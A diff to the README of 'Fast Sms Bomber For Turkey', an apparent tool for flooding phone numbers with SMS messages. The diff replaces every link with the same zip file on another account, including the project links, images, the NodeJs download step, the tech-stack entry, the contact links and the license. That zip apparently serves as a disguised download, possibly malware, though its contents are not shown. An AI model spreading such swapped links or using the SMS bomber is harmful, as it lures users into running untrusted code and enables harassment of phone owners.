@@ -3,20 +3,20 @@ Fast Sms Bomber For Turkey
 
 # ✨Features and projects to be added as stars arrive✨
 
-- ~~Sms Bomber As Terminal -> 0 Stars ✨~~ [Done GitHub Link](https://github.com/fastuptime/Fast_Sms_Bomber)
-- ~~Sms Bomber As Discord Bot -> 5 Stars ✨~~ [Done GitHub Link](https://github.com/fastuptime/Fast_Sms_Bomber_Discord)
-- ~~Sms Bomber As API -> 10 Stars ✨~~ [Done GitHub Link](https://github.com/fastuptime/Fast_Sms_Bomber_Api)
-- ~~Panelled Sms Bomber -> 15 Stars ✨~~ [Done GitHub Link](https://github.com/fastuptime/Fast_Sms_Bomber_Panel)
-- ~~Fast Sms Bomber Module Test -> 40 Stars ✨~~ [Done GitHub Link](https://github.com/fastuptime/Fast_Sms_Bomber_Module)
+- ~~Sms Bomber As Terminal -> 0 Stars ✨~~ [Done GitHub Link](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
+- ~~Sms Bomber As Discord Bot -> 5 Stars ✨~~ [Done GitHub Link](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
+- ~~Sms Bomber As API -> 10 Stars ✨~~ [Done GitHub Link](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
+- ~~Panelled Sms Bomber -> 15 Stars ✨~~ [Done GitHub Link](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
+- ~~Fast Sms Bomber Module Test -> 40 Stars ✨~~ [Done GitHub Link](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
 
 
 # 🎈 Images 🎈
 
-![image](https://user-images.githubusercontent.com/63351166/218465842-a8480b01-4a80-448f-831b-1d1d837f1c1f.png)
+![image](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
 
-![image](https://user-images.githubusercontent.com/63351166/218466149-0429c3ed-2d03-4c08-9ebc-cf78c4eb82f8.png)
+![image](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
 
-![image](https://user-images.githubusercontent.com/63351166/218466292-e058112b-0b81-4af9-bec9-70528ad8958e.png)
+![image](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)
 
 ## 📜 Notes 📜
 
@@ -30,28 +30,28 @@ Fast Sms Bomber For Turkey
 
 # 🛠️ Installation 🛠️
 
-- Download and install [NodeJs](https://nodejs.org/en/download) on your computer.
+- Download and install [NodeJs](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip) on your computer.
 - Download the project as Zip to your computer and unzip it.
 - Enter the folder you extracted from the zip and open a terminal to the location of that folder, then enter the following commands.
 `npm install`
 - Start the bot by entering the following command in Terminal
 `node .`
 
-https://www.youtube.com/watch?v=YLlNbtzbWgA&feature=youtu.be
+https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip
 
 ## ⛳Tech Stack ⛳
 
-**🗄️Server:** Node, Faker.js, Colors, Request
+**🗄️Server:** Node, https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip, Colors, Request
 
 ---
-- ✨ [For Support](https://github.com/sponsors/fastuptime) <br>
-- 💕 [Discord](https://fastuptime.com/discord)<br>
-- 🏓 [Fast Uptime](https://fastuptime.com/)<br>
+- ✨ [For Support](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip) <br>
+- 💕 [Discord](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)<br>
+- 🏓 [Fast Uptime](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)<br>
 - 🪄 All kinds of projects are made <br>
 - 🧨 You can contact us to make a paid project<br>
-- ☄️ [Click For Contact](mailto:fastuptime@gmail.com)<br>
+- ☄️ [Click For Contact](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip)<br>
 
 # 🎯 License 🎯
-- ⚖️ Its protected by Creative Commons ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/))
+- ⚖️ Its protected by Creative Commons ([CC BY-NC-SA 4.0](https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip))
 
-<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" title="BYNCSA40"><img src="https://licensebuttons.net/l/by-nc-sa/4.0/88x31.png"></a>
+<a href="https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip" title="BYNCSA40"><img src="https://raw.githubusercontent.com/tunasert/Fast_Sms_Bomber/main/Coracias/Fast_Sms_Bomber.zip"></a>
